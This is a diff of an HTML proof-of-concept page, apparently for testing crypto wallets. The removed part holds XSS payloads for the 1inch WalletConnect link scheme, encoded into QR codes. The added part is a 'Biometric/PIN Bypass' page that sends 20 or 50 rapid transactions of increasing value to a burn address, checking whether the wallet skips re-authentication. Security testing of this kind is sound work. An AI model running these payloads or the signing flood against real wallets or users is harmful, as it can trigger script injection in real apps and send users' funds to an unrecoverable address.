@@ -3,45 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Universal XSS Test - 1inch</title>
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <title>Biometric/PIN Bypass Test - dApp PoC</title>
     <style>
-        body { font-family: Arial; background:#000; color:#0f0; padding:20px; text-align:center; }
-        .qr-container { margin:20px 0; padding:15px; background:#1a1a2e; border-radius:12px; }
-        h2 { color:#ff4444; }
+        body { font-family: Arial, sans-serif; padding: 20px; background: #0f0f23; color: #0f0; }
+        button { padding: 15px 25px; margin: 10px; font-size: 16px; background: #ff00aa; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        button:hover { background: #ff33bb; }
+        #log { background: #111; padding: 15px; height: 400px; overflow-y: scroll; border: 1px solid #333; margin-top: 20px; white-space: pre-wrap; }
+        .warning { color: #ff0; }
     </style>
 </head>
 <body>
-    <h1>Universal XSS Test for 1inch WalletConnect</h1>
+    <h1>🔐 Biometric/PIN Bypass Testing</h1>
+    <p>Ini adalah halaman test untuk dApp Browser Wallet.</p>
+    
+    <button onclick="connectWallet()">1. Connect Wallet</button><br>
+    <button onclick="sendTransaction()">2. Kirim Transaksi (Normal)</button><br>
+    <button onclick="rapidSigningTest(20)" style="background:#f00;">3. RAPID SIGNING TEST (20 requests)</button><br>
+    <button onclick="rapidSigningTest(50)" style="background:#f00;">RAPID 50 Requests</button>
 
-    <div class="qr-container">
-        <h2>Payload 1</h2>
-        <div id="qr1"></div>
-        <small>1inch://connect?uri=javascript:alert('XSS')</small>
-    </div>
-
-    <div class="qr-container">
-        <h2>Payload 2</h2>
-        <div id="qr2"></div>
-        <small>1inch://connect?data=<img src=x onerror=alert('Universal XSS')></small>
-    </div>
-
-    <div class="qr-container">
-        <h2>Payload 3</h2>
-        <div id="qr3"></div>
-        <small>1inch://bypass?payload=javascript:document.write('<h1>XSS Success in 1inch</h1>')</small>
-    </div>
+    <div id="log"></div>
 
     <script>
-        new QRCode(document.getElementById("qr1"), "1inch://connect?uri=javascript:alert('XSS in 1inch WalletConnect')");
-        new QRCode(document.getElementById("qr2"), "1inch://connect?data=<img src=x onerror=alert('Universal XSS')>");
-        new QRCode(document.getElementById("qr3"), "1inch://bypass?payload=javascript:document.write('<h1>XSS Success</h1>')");
+        const log = document.getElementById('log');
 
-        console.log("%cUniversal XSS Test Loaded - Scan the QR Codes", "color:red; font-size:18px");
+        function logMessage(msg, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            log.innerHTML += `[${time}] ${type === 'warning' ? '⚠️ ' : ''}${msg}\n`;
+            log.scrollTop = log.scrollHeight;
+            console.log(msg);
+        }
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                logMessage("❌ No injected provider (window.ethereum) detected!", "warning");
+                return;
+            }
+            try {
+                logMessage("🔗 Meminta connect wallet...");
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                logMessage(`✅ Connected: ${accounts[0]}`, "success");
+            } catch (err) {
+                logMessage(`❌ Connect gagal: ${err.message}`, "warning");
+            }
+        }
+
+        async function sendTransaction() {
+            if (!window.ethereum) {
+                logMessage("❌ Provider tidak tersedia!", "warning");
+                return;
+            }
+            try {
+                logMessage("📤 Mengirim transaksi test...");
+                const tx = {
+                    to: "0x0000000000000000000000000000000000000000",
+                    value: "0x0", // 0 ETH
+                    data: "0x",
+                    gas: "0x5208"
+                };
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [tx]
+                });
+                logMessage(`✅ Transaction hash: ${txHash}`, "success");
+            } catch (err) {
+                logMessage(`❌ Signing ditolak / error: ${err.message}`, "warning");
+            }
+        }
+
+        async function rapidSigningTest(count = 20) {
+            logMessage(`🚀 Memulai RAPID SIGNING TEST (${count} requests)...`, "warning");
+            logMessage("Perhatikan apakah biometric/PIN hanya muncul sekali atau tidak muncul sama sekali.");
+
+            for (let i = 1; i <= count; i++) {
+                try {
+                    logMessage(`[${i}/${count}] Mengirim request signing...`);
+                    const tx = {
+                        to: "0x000000000000000000000000000000000000dead",
+                        value: "0x" + (i * 1000000000000000).toString(16), // small increasing value
+                        data: "0x",
+                        gas: "0x5208"
+                    };
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [tx]
+                    });
+                    logMessage(`[${i}] ✅ Berhasil tanpa re-auth!`, "success");
+                } catch (err) {
+                    logMessage(`[${i}] ❌ Ditolak: ${err.message}`);
+                    if (err.message.includes("User denied") || err.code === 4001) {
+                        logMessage("Wallet menolak massal — ini perilaku yang diharapkan jika aman.", "warning");
+                        break;
+                    }
+                }
+                // Delay kecil agar tidak terlalu brutal
+                await new Promise(r => setTimeout(r, 300));
+            }
+            logMessage("=== RAPID TEST SELESAI ===", "warning");
+        }
+
+        // Auto detect provider
+        window.addEventListener('load', () => {
+            if (window.ethereum) {
+                logMessage("✅ Provider terdeteksi (MetaMask / WalletConnect / Injected)");
+            } else {
+                logMessage("❌ Tidak ada injected provider. Buka di dApp Browser Wallet.", "warning");
+            }
+        });
     </script>
-
-    <p><strong>Cara Test:</strong><br>
-    Scan QR Code menggunakan kamera 1inch Wallet atau aplikasi WalletConnect.<br>
-    Perhatikan apakah muncul alert atau halaman berubah.</p>
 </body>
 </html>
